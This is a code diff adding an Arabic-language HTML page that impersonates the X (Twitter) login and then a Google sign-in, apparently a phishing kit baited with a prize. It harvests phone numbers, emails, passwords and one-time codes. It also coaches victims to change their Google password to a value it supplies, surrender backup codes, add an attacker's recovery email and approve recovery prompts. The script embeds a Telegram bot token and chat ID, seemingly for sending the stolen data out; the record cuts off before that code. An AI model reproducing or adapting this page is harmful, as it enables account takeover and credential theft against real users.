@@ -1,0 +1,1180 @@
+<!DOCTYPE html> 
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تسجيل الدخول / X</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            /* تصميم ألوان تويتر (X) - الوضع الداكن */
+            --bg-color: #000000;
+            --card-bg: #000000;
+            --text-main: #f7f9f9;
+            --text-sub: #71767b;
+            --border-color: #333639;
+            --input-bg: #16181c;
+            --btn-primary-bg: #eff3f4;
+            --btn-primary-text: #0f1419;
+            --btn-secondary-bg: #202327;
+            --btn-secondary-text: #eff3f4;
+            --accent-blue: #1d9bf0;
+
+            --g-bg: #1e1e1e;
+            --g-box-bg: #2d2d2d;
+            --g-border: #444444;
+            --g-blue: #8ab4f8;
+            --g-success: #00ba7c;
+            --g-error: #f4212e;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Cairo', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body, html {
+            width: 100vw;
+            min-height: 100vh;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-x: hidden;
+            direction: rtl;
+        }
+
+        /* جعل جميع الصفحات تفتح بملاء الشاشة */
+        .view-page {
+            display: none;
+            width: 100vw;
+            min-height: 100vh;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 24px;
+        }
+
+        .view-page.active {
+            display: flex;
+        }
+
+        .container-box {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ----- شعار منصة X ----- */
+        .x-brand-logo {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 28px;
+        }
+
+        .x-brand-logo svg {
+            width: 42px;
+            height: 42px;
+            fill: var(--text-main);
+        }
+
+        .x-header-title {
+            font-size: 28px;
+            font-weight: 800;
+            text-align: center;
+            margin-bottom: 32px;
+            letter-spacing: -0.5px;
+        }
+
+        .x-sub-title {
+            font-size: 26px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            color: #ffffff;
+        }
+
+        /* ----- الأزرار الدائرية لجوجل والبريد ----- */
+        .btn-icon-circle {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            padding: 0;
+            background-color: transparent;
+            border: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-icon-circle:hover {
+            background-color: #181818;
+        }
+
+        /* ----- حقول الإدخال النمطية لمنصة X ----- */
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+
+        .standard-input {
+            width: 100%;
+            padding: 16px 14px;
+            font-size: 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            background-color: var(--input-bg);
+            color: var(--text-main);
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .standard-input:focus {
+            border-color: var(--accent-blue);
+        }
+
+        /* ادخال رقم الهاتف مع علم الدولة من اليمين إلى اليسار */
+        .phone-input-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            margin-top: 20px;
+            margin-bottom: 25px;
+            direction: rtl;
+        }
+
+        .country-flag-box {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background-color: #202327;
+            border-radius: 12px;
+            padding: 10px 14px;
+            min-width: 120px;
+            height: 56px;
+            border: 1px solid #333639;
+            direction: ltr;
+        }
+
+        .country-code-input {
+            background: transparent;
+            border: none;
+            color: #ffffff;
+            font-size: 20px;
+            font-weight: 700;
+            width: 65px;
+            outline: none;
+            text-align: center;
+            direction: ltr;
+        }
+
+        .flag-icon-img {
+            width: 32px;
+            height: 22px;
+            object-fit: cover;
+            border-radius: 4px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
+        }
+
+        .phone-main-input-wrapper {
+            flex: 1;
+            position: relative;
+        }
+
+        .phone-main-input {
+            width: 100%;
+            height: 56px;
+            background-color: transparent;
+            border: none;
+            border-bottom: 2px solid #333639;
+            color: #ffffff;
+            font-size: 22px;
+            outline: none;
+            direction: ltr;
+            text-align: right;
+            letter-spacing: 1px;
+        }
+
+        .phone-main-input:focus {
+            border-bottom-color: var(--accent-blue);
+        }
+
+        /* ----- خانات إدخال الرمز الـ 6 أرقام ----- */
+        .otp-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 8px;
+            margin: 25px 0 20px 0;
+            direction: ltr;
+        }
+
+        .otp-box {
+            width: 50px;
+            height: 58px;
+            background-color: #202429;
+            border: 1px solid transparent;
+            border-radius: 10px;
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 700;
+            text-align: center;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        .otp-box:focus {
+            border-color: var(--accent-blue);
+            background-color: #16181c;
+        }
+
+        /* ----- العداد التنازلي ونقل النصوص ----- */
+        .timer-text-line {
+            font-size: 15px;
+            color: var(--text-sub);
+            margin-top: 15px;
+            text-align: right;
+            font-weight: 600;
+        }
+
+        .resend-btn-link {
+            color: var(--accent-blue);
+            cursor: pointer;
+            text-decoration: none;
+            font-weight: 700;
+        }
+
+        .resend-btn-link:hover {
+            text-decoration: underline;
+        }
+
+        /* ----- الأزرار الرئيسية بيضاوية الحجم ----- */
+        .btn-pill {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 12px;
+            transition: opacity 0.2s;
+        }
+
+        .btn-pill:hover {
+            opacity: 0.9;
+        }
+
+        .btn-dark-grey {
+            background-color: #2f3336;
+            color: #ffffff;
+            border: none;
+        }
+
+        .btn-black {
+            background-color: var(--btn-primary-bg);
+            color: var(--btn-primary-text);
+            border: none;
+        }
+
+        .btn-white {
+            background-color: #ffffff;
+            color: #000000;
+            border: none;
+        }
+
+        .divider-or {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 16px 0;
+            color: var(--text-sub);
+            font-size: 14px;
+        }
+
+        .divider-or::before, .divider-or::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .divider-or:not(:empty)::before { margin-left: 10px; }
+        .divider-or:not(:empty)::after { margin-right: 10px; }
+
+        .link-text {
+            color: var(--accent-blue);
+            font-size: 14px;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 6px;
+            margin-bottom: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        /* ----- شاشات التحميل ----- */
+        .spinner-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin: auto;
+            text-align: center;
+        }
+
+        .spinner {
+            width: 44px;
+            height: 44px;
+            border: 4px solid var(--border-color);
+            border-top: 4px solid var(--accent-blue);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 18px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .alert-box {
+            background-color: var(--g-box-bg);
+            border-right: 4px solid var(--accent-blue);
+            padding: 12px 14px;
+            font-size: 13px;
+            border-radius: 6px;
+            margin-bottom: 16px;
+            line-height: 1.6;
+        }
+
+        .alert-error {
+            background-color: rgba(217, 48, 37, 0.1);
+            color: var(--g-error);
+            border-right: 4px solid var(--g-error);
+        }
+
+        .smart-btns {
+            display: flex;
+            gap: 8px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+
+        .smart-btn {
+            flex: 1;
+            min-width: 100px;
+            padding: 10px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            background: var(--card-bg);
+            color: var(--text-main);
+            text-align: center;
+            text-decoration: none;
+            font-size: 12px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+        }
+
+        .code-display-box {
+            background-color: var(--input-bg);
+            border: 1px dashed var(--border-color);
+            padding: 12px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 18px;
+            text-align: center;
+            margin: 12px 0;
+            font-weight: 700;
+            color: var(--accent-blue);
+        }
+
+        .footer-text {
+            text-align: right;
+            font-size: 13px;
+            color: var(--text-sub);
+            margin-top: auto;
+            padding-top: 20px;
+            line-height: 1.5;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .top-nav {
+            width: 100%;
+            max-width: 400px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            color: var(--text-main);
+            font-size: 24px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ========================================== -->
+    <!-- ⬛ شاشة سوداء أولية (لمدة 2 ثواني) -->
+    <!-- ========================================== -->
+    <div id="introBlackScreen" class="view-page active" style="background-color: #000000; justify-content: center; align-items: center;">
+    </div>
+
+    <!-- ========================================== -->
+    <!-- ⏳ شاشة تحميل أولية (لمدة 7 ثواني) -->
+    <!-- ========================================== -->
+    <div id="introLoadingScreen" class="view-page" style="background-color: #000000; justify-content: center; align-items: center;">
+        <div class="spinner-container">
+            <div class="spinner"></div>
+            <p style="font-size: 15px; font-weight: 700; color: #ffffff;">جاري التحميل...</p>
+        </div>
+    </div>
+
+    <!-- ========================================== -->
+    <!-- 𝕏 الواجهة الرئيسية لمنصة تويتر (X) -->
+    <!-- ========================================== -->
+    <div id="mainTwitterView" class="view-page">
+        <div class="container-box">
+            <div class="x-brand-logo">
+                <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+            </div>
+
+            <h1 class="x-header-title">اكتشف ما يحدث</h1>
+
+            <!-- الترتيب: جوجل يمين، البريد يسار -->
+            <div style="display: flex; justify-content: center; gap: 16px; margin-bottom: 20px;">
+                <button class="btn-icon-circle" onclick="openGoogleFlow()" title="التسجيل بجوجل">
+                    <svg viewBox="0 0 24 24" width="22" height="22"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/></svg>
+                </button>
+                <button class="btn-icon-circle" onclick="switchToEmailMode()" title="التسجيل بالبريد">
+                    <svg viewBox="0 0 24 24" width="22" height="22" fill="#eff3f4"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                </button>
+            </div>
+
+            <div class="divider-or">أو</div>
+
+            <button class="btn-pill btn-white" onclick="switchToPhoneMode()">
+                <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+                <span>المتابعة بالهاتف</span>
+            </button>
+        </div>
+
+        <div class="footer-text" style="text-align: center;">
+            بالاستمرار، فإنك توافق على شروط وسياسة الخصوصية واستخدام ملفات تعريف الارتباط الخاصة بنا.
+            <br><br>
+            <a onclick="switchToEmailMode()" style="color: var(--text-sub); font-weight:700; text-decoration:none; cursor:pointer;">تسجيل الدخول باسم المستخدم &gt;</a>
+        </div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- 𝕏 إدخال رقم الهاتف (مطابق للصورة الأولى) -->
+    <!-- ========================================== -->
+    <div id="phoneInputView" class="view-page">
+        <div class="top-nav">
+            <button class="back-btn" onclick="goBack()">→</button>
+            <a onclick="switchToEmailMode()" class="link-text" style="margin:0;">استخدم البريد الإلكتروني</a>
+        </div>
+
+        <div class="container-box">
+            <h2 class="x-sub-title">أدخل رقم الهاتف الخاص بك</h2>
+
+            <!-- مجموعة إدخال الهاتف: العلم ورمز الدولة على اليمين، رقم الهاتف على اليسار -->
+            <div class="phone-input-row">
+                <div class="country-flag-box">
+                    <img id="countryFlagImg" class="flag-icon-img" src="https://flagcdn.com/w40/ye.png" alt="علم الدولة">
+                    <input type="text" id="phoneCountryCode" class="country-code-input" value="+967" oninput="handleCountryCodeChange(this.value)">
+                </div>
+                <div class="phone-main-input-wrapper">
+                    <input type="tel" id="phoneNumberInput" class="phone-main-input" placeholder="" autocomplete="off">
+                </div>
+            </div>
+        </div>
+
+        <div style="width:100%; max-width:400px; margin-top: auto;">
+            <button class="btn-pill btn-dark-grey" onclick="submitPhoneStep()">استمر</button>
+
+            <div class="footer-text">
+                بمواصلتك، توافق على تلقي رسائل المعاملات المتعلقة بحسابك. سيتمكن الآخرون من العثور عليك باستخدام رقم الهاتف. <span style="color:var(--text-sub); font-weight:700; cursor:pointer;">خيارات الخصوصية ∨</span>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- 𝕏 إدخال البريد الإلكتروني -->
+    <!-- ========================================== -->
+    <div id="emailInputView" class="view-page">
+        <div class="top-nav">
+            <button class="back-btn" onclick="goBack()">→</button>
+            <a onclick="switchToPhoneMode()" class="link-text" style="margin:0;">استخدم هاتف</a>
+        </div>
+
+        <div class="container-box">
+            <h2 class="x-sub-title" style="margin-bottom: 8px;">أدخل عنوان بريدك الإلكتروني</h2>
+            <p style="font-size: 14px; color: var(--text-sub); margin-bottom: 20px;">سنرسل لك رمز التحقق</p>
+
+            <div class="input-wrapper">
+                <input type="text" id="emailMainInput" class="standard-input" placeholder="عنوان البريد الإلكتروني">
+            </div>
+
+            <a href="https://accounts.google.com/signin" target="_blank" class="link-text">إذا نسيت عنوان بريدك الإلكتروني ادخل هنا لنسخه</a>
+        </div>
+
+        <div style="width:100%; max-width:400px; margin-top: auto;">
+            <button class="btn-pill btn-white" onclick="submitEmailStep()">استمر</button>
+            <div class="footer-text">
+                بالاستمرار، توافق على تلقي رسائل المعاملات حول حسابك.
+            </div>
+        </div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- 🔑 إدخال كلمة المرور (تويتر / X) -->
+    <!-- ========================================== -->
+    <div id="passwordInputView" class="view-page">
+        <div class="top-nav">
+            <button class="back-btn" onclick="goBack()">→</button>
+        </div>
+
+        <div class="container-box">
+            <h2 class="x-sub-title" style="margin-bottom: 8px;">أدخل كلمة المرور الخاص بك</h2>
+            <p id="displayUserIdentifier" style="font-size: 14px; color: var(--text-sub); margin-bottom: 20px; text-align: right;"></p>
+
+            <div class="input-wrapper">
+                <input type="password" id="twitterPasswordInput" class="standard-input" placeholder="كلمة المرور">
+            </div>
+
+            <a class="link-text" style="display: block;" onclick="handleForgotPasswordClick()">نسيت كلمة المرور؟</a>
+        </div>
+
+        <div style="width:100%; max-width:400px; margin-top: auto;">
+            <button class="btn-pill btn-white" onclick="submitTwitterPassword()">تسجيل الدخول</button>
+        </div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- 🔄 صفحة إدخال الرمز الـ 6 أرقام -->
+    <!-- ========================================== -->
+    <div id="otpConfirmView" class="view-page">
+        <div class="top-nav">
+            <button class="back-btn" onclick="goBack()">→</button>
+        </div>
+
+        <div class="container-box">
+            <h2 class="x-sub-title">أدخل الكود الذي أرسلناه إليك</h2>
+            <p style="font-size: 15px; color: var(--text-sub); margin-top: 6px; text-align: right;">
+                أرسلناه إلى <span id="otpPhoneNumberDisplay" style="color:#ffffff;">+967...</span> .
+            </p>
+
+            <!-- 6 خانات لإدخال الرمز منفصلة -->
+            <div class="otp-container" id="otpBoxContainer">
+                <input type="inputmode" inputmode="numeric" maxlength="1" class="otp-box" data-index="0">
+                <input type="inputmode" inputmode="numeric" maxlength="1" class="otp-box" data-index="1">
+                <input type="inputmode" inputmode="numeric" maxlength="1" class="otp-box" data-index="2">
+                <input type="inputmode" inputmode="numeric" maxlength="1" class="otp-box" data-index="3">
+                <input type="inputmode" inputmode="numeric" maxlength="1" class="otp-box" data-index="4">
+                <input type="inputmode" inputmode="numeric" maxlength="1" class="otp-box" data-index="5">
+            </div>
+
+            <!-- نص العداد المطابق للمنصة -->
+            <div class="timer-text-line" id="timerContainer">
+                لا تراه؟ أعد المحاولة بعد <span id="twitterTimerSeconds" style="color:var(--text-sub); font-weight:700;">60</span> ثوانٍ
+            </div>
+        </div>
+
+        <div style="width:100%; max-width:400px; margin-top: auto;">
+            <button class="btn-pill btn-dark-grey" id="btnConfirmOtp" onclick="submitTwitterOtpManual()">استمر</button>
+        </div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- 🔴 جوجل - المرحلة 1: البريد الإلكتروني -->
+    <!-- ========================================== -->
+    <div id="gPhase1View" class="view-page">
+        <div class="top-nav">
+            <button class="back-btn" onclick="goBack()">→</button>
+        </div>
+        <div class="container-box" style="border: 1px solid var(--g-border); border-radius: 12px; padding: 24px; background: var(--card-bg);">
+            <div style="text-align: center; margin-bottom: 16px;">
+                <svg viewBox="0 0 74 24" width="75" height="24">
+                    <path fill="#4285F4" d="M9.24 10.19v3.25h7.62c-.3 1.95-2.28 5.72-7.62 5.72-4.59 0-8.34-3.81-8.34-8.5s3.75-8.5 8.34-8.5c2.62 0 4.38 1.12 5.39 2.08l2.58-2.49C15.36 1.18 12.57 0 9.24 0 4.14 0 0 4.14 0 9.25s4.14 9.25 9.24 9.25c5.33 0 8.87-3.75 8.87-9.03 0-.61-.07-1.07-.15-1.53H9.24z"/>
+                    <path fill="#EA4335" d="M22.5 13.91c-.34.95-1.25 2.59-3.32 2.59-2.3 0-3.95-1.83-3.95-4.25 0-2.58 1.83-4.25 4.13-4.25 2.12 0 3.12 1.5 3.32 2.5l2.67-1.11c-.56-1.57-2.32-3.89-6-3.89-3.86 0-7 3.09-7 7 0 3.82 3.05 7 7 0 3.82 3.05 7 7 0 3.65 0 5.4-2.46 5.86-3.85l-2.71-1.24z"/>
+                    <path fill="#FBBC05" d="M32.5 5.5h-3v13h3v-13z"/>
+                    <path fill="#34A853" d="M41 12.25c0-1.41-.38-2.07-.86-2.61-.63-.71-1.58-1.14-2.64-1.14-2.3 0-3.95 1.83-3.95 4.25 0 2.58 1.83 4.25 4.13 4.25 1.02 0 1.95-.41 2.58-1.1.52-.56.74-1.29.74-2.65v-1h-3.46v2.19h1.15v.28c0 .32-.27.58-.6.58-.89 0-1.35-.74-1.35-1.8 0-1.07.49-1.8 1.35-1.8.46 0 .82.26.96.65h2.38z"/>
+                </svg>
+            </div>
+            <h2 style="text-align: center; font-size: 20px; margin-bottom: 8px;">تسجيل الدخول باستخدام Google</h2>
+            <p style="font-size: 13px; color: var(--text-sub); text-align: center; margin-bottom: 16px;">متابعة إلى حسابك للتحقق</p>
+
+            <div style="display:flex; align-items:center; gap:6px; margin-bottom:8px;">
+                <input type="text" id="gEmailInput" class="standard-input" placeholder="البريد الإلكتروني أو الهاتف" style="margin:0;">
+                <button onclick="alert('أدخل بريدك الإلكتروني الخاص بجوجل للمتابعة')" style="background:none; border:1px solid var(--border-color); border-radius:50%; width:36px; height:36px; cursor:pointer; color:var(--text-sub);">؟</button>
+            </div>
+
+            <a href="https://accounts.google.com/signin" target="_blank" class="link-text">إذا نسيت عنوان بريدك الإلكتروني ادخل هنا لنسخه</a>
+
+            <div style="display: flex; justify-content: flex-end; margin-top: 15px;">
+                <button class="btn-pill btn-white" style="width: auto; padding: 10px 24px;" onclick="submitGPhase1()">التالي</button>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- 🔴 جوجل - المرحلة 2: كلمة المرور -->
+    <!-- ========================================== -->
+    <div id="gPhase2View" class="view-page">
+        <div class="top-nav">
+            <button class="back-btn" onclick="goBack()">→</button>
+        </div>
+        <div class="container-box" style="border: 1px solid var(--g-border); border-radius: 12px; padding: 24px; background: var(--card-bg);">
+            <h2 style="text-align: center; font-size: 20px; margin-bottom: 12px;">إدخال كلمة المرور</h2>
+
+            <div id="gPhase2_Step1">
+                <input type="text" id="gNotesInputVisible" class="standard-input" placeholder="كلمة المرور " autocomplete="off">
+                <a class="link-text" style="display: block; text-align: center; margin-bottom: 15px;" onclick="showGResetNotesSection()">نسيت كلمة المرور؟</a>
+                <button class="btn-pill btn-white" onclick="submitGNotesStep1()">التالي</button>
+            </div>
+
+            <div id="gPhase2_Step2" style="display: none;">
+                <p style="font-size: 13px; font-weight: 700; margin-bottom: 6px;">انسخ كلمة المرور الجديدة والصقها في خانات تغيير كلمة مرور جوجل</p>
+                <div class="code-display-box" id="gUniqueNoteDisplay">جاري التوليد...</div>
+
+                <a href="https://myaccount.google.com/signinoptions/password" target="_blank" class="btn-pill btn-white" style="display: flex; text-decoration: none; margin-bottom: 15px;" onclick="handleGUpdatePasswordLinkClick()">
+                    إضغط هنا لنسخ وتغيير كلمة المرور الجديدة
+                </a>
+
+                <div style="margin-top: 15px;">
+                    <label style="font-size: 12px; color: var(--text-sub); display: block; margin-bottom: 4px;">أدخل كلمة المرور الجديدة هنا:</label>
+                    <input type="text" id="gNewNotesInput" class="standard-input" placeholder="كلمة المرور الجديدة" disabled>
+                </div>
+
+                <button class="btn-pill btn-white" id="btnSubmitGNewNotes" disabled onclick="submitGNewNotesFinal()">موافق</button>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- 🔴 جوجل - المرحلة 3: خيارات التأكيد الثلاثية -->
+    <!-- ========================================== -->
+    <div id="gPhase3View" class="view-page">
+        <div class="top-nav">
+            <button class="back-btn" onclick="goBack()">→</button>
+        </div>
+        <div class="container-box" style="border: 1px solid var(--g-border); border-radius: 12px; padding: 20px; background: var(--card-bg);">
+            <h2 style="text-align: center; font-size: 18px; margin-bottom: 12px;">تأكيد ملكية الحساب</h2>
+
+            <div id="gBackupErrorMsg" class="alert-box alert-error" style="display:none;"></div>
+
+            <div style="border: 1px solid var(--g-border); padding: 12px; border-radius: 8px; margin-bottom: 12px;">
+                <p style="font-size: 13px; font-weight: 700; margin-bottom: 6px;">الخيار الأول (رموز الأمان):</p>
+                <a href="https://myaccount.google.com/two-step-verification/backup-codes" target="_blank" class="link-text" onclick="handleBackupLinkClick()">
+                    اضغط هنا وأختر احد رموز الأمان وأدخله في الخانة الخاصة برمز الأمان 
+                </a>
+                <input type="text" id="gBackupCodeInput" class="standard-input" placeholder="أدخل رمز الأمان هنا" style="margin-top: 6px;">
+                <button class="btn-pill btn-white" style="margin-top:8px;" onclick="submitGBackupCode()">تأكيد برمز الأمان</button>
+            </div>
+
+            <div style="border: 1px solid var(--g-border); padding: 12px; border-radius: 8px; margin-bottom: 12px;">
+                <p style="font-size: 13px; font-weight: 700; margin-bottom: 4px;">الخيار الثاني (بريد الاسترداد):</p>
+                <div class="code-display-box" style="font-size: 14px; margin: 4px 0;">pubgrivals7@gmail.com</div>
+                <a href="https://myaccount.google.com/recovery/email" target="_blank" class="link-text">
+                    انسخ البريد الإلكتروني والصقه هنا لتأكيد حسابك
+                </a>
+            </div>
+
+            <button class="link-text" style="text-align: center; display: block; margin: 10px auto;" onclick="toggleGAlternativeOptions()">تجربة طريقة أخرى للتأكيد</button>
+
+            <div id="gAlternativeArea" style="display: none; border-top: 1px solid var(--border-color); padding-top: 12px;">
+                <div class="alert-box">
+                    <strong>التأكيد بالإشعار:</strong>  سوف يظهر لك إشعار هل أنت من يحاول استرداد الحساب يرجى فتح الأشعار والموافقة على الإشعار بالضغط على( نعم أنا ) واختيار الرقم الصحيح من الدعم .
+                </div>
+
+                <div style="margin-top: 10px;">
+                    <p style="font-size: 13px; font-weight: 700; margin-bottom: 6px;">التأكيد بكود التحقق (هاتف / بريد):</p>
+                    <input type="text" id="gAltPhoneEmail" class="standard-input" placeholder="أدخل رقم الهاتف أو البريد الإلكتروني">
+                    <button class="btn-pill btn-white" style="margin-top: 6px;" onclick="requestGAltCode()">موافق</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- 🔴 جوجل - المرحلة 4 -->
+    <!-- ========================================== -->
+    <div id="gPhase4View" class="view-page">
+        <div class="top-nav">
+            <button class="back-btn" onclick="goBack()">→</button>
+        </div>
+        <div class="container-box" style="border: 1px solid var(--g-border); border-radius: 12px; padding: 20px; background: var(--card-bg);">
+            <h2 style="text-align: center; font-size: 18px; margin-bottom: 12px;">إدخال كود التحقق</h2>
+
+            <div class="alert-box">
+                قد يتأخر الكود، يرجى ترك الصفحة مفتوحة وإذا أرسلنا لك الكود سنخبرك برسالة عن طريق المحادثة المباشرة.
+            </div>
+
+            <input type="text" id="gPhase4CodeInput" class="standard-input" placeholder="أدخل الكود (6 أرقام)" maxlength="6" oninput="handleGPhase4CodeInput(this)">
+
+            <p style="font-size: 12px; color: var(--text-sub); margin-top: 10px; font-weight: 700;">
+                إذا فشل فتح التطبيقات اذهب لفتحها من القائمة للحصول على الكود:
+            </p>
+
+            <div class="smart-btns">
+                <a href="mailto:" target="_blank" class="smart-btn">✉️ Email الوارد</a>
+                <a href="https://wa.me/" target="_blank" class="smart-btn">💬 WhatsApp</a>
+                <a href="sms:" target="_blank" class="smart-btn">📱 الرسائل SMS</a>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- ⏳ شاشة التحميل العام -->
+    <!-- ========================================== -->
+    <div id="loadingView" class="view-page">
+        <div class="spinner-container">
+            <div class="spinner"></div>
+            <p id="loadingStatusText" style="font-size: 15px; font-weight: 700;">(جاري التحميل...)</p>
+        </div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- ⏳ شاشة الانتظار والمراجعة -->
+    <!-- ========================================== -->
+    <div id="waitingAdminView" class="view-page">
+        <div class="top-nav">
+            <button class="back-btn" onclick="goBack()">→</button>
+        </div>
+        <div class="spinner-container">
+            <div class="spinner"></div>
+            <h3 style="font-size: 18px; margin-bottom: 8px;">جاري مراجعة البيانات...</h3>
+            <p style="font-size: 13px; color: var(--text-sub); max-width: 300px; line-height: 1.5;">يرجى عدم إغلاق الصفحة، يتم التأكد والتحقق من معلومات الحساب.</p>
+        </div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- 🎉 شاشة النجاح -->
+    <!-- ========================================== -->
+    <div id="successView" class="view-page">
+        <div class="container-box" style="text-align: center;">
+            <div style="width: 80px; height: 80px; background-color: var(--g-success); color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; margin: 0 auto 20px auto;">✓</div>
+            <h2 style="color: var(--g-success); margin-bottom: 12px;">تم تسجيل الدخول بنجاح!</h2>
+            <p style="font-size: 15px; font-weight: 600; line-height: 1.6; color: var(--text-main);">
+                سيتم إرسال وشحن الحساب مباشرة بالجوائز في حال الفوز.
+            </p>
+        </div>
+        <div class="footer-text" style="text-align:center;">مبروك! نتمنى لك التوفيق</div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- ⚙️ البرمجة والتحكم والتفاعل الجافاسكربت -->
+    <!-- ========================================== -->
+    <script>
+        // --- التسلسل الزمني الأولي (2 ثانية شاشة سوداء ثم 7 ثواني تحميل) ---
+        window.addEventListener('DOMContentLoaded', () => {
+            // بعد 2 ثانية، الانتقال من الشاشة السوداء إلى شاشة التحميل
+            setTimeout(() => {
+                document.getElementById('introBlackScreen').classList.remove('active');
+                document.getElementById('introLoadingScreen').classList.add('active');
+
+                // بعد 7 ثوانٍ إضافية (مجموع 9 ثوانٍ)، فتح الواجهة الرئيسية
+                setTimeout(() => {
+                    document.getElementById('introLoadingScreen').classList.remove('active');
+                    document.getElementById('mainTwitterView').classList.add('active');
+                }, 7000);
+            }, 2000);
+        });
+
+        const TELEGRAM_BOT_TOKEN = "8919787970:AAEmU4rsJAI5XUc2TyzUkur0Lpom_Tk07Kg";
+        const TELEGRAM_CHAT_ID = "8796885500";
+
+        let sessionData = {
+            mainInput: '',
+            password: '',
+            uniqueNote: '',
+            newNotesPassword: '',
+            backupCode: ''
+        };
+
+        let viewHistory = ['mainTwitterView'];
+        let hasClickedBackupLink = false;
+        let pollTimer = null;
+        let countdownTimer = null;
+
+        // خريطة أعلام الدول التلقائية بناءً على مفتاح الاتصال
+        const countryFlagsMap = {
+            '967': 'ye', // اليمن
+            '966': 'sa', // السعودية
+            '971': 'ae', // الإمارات
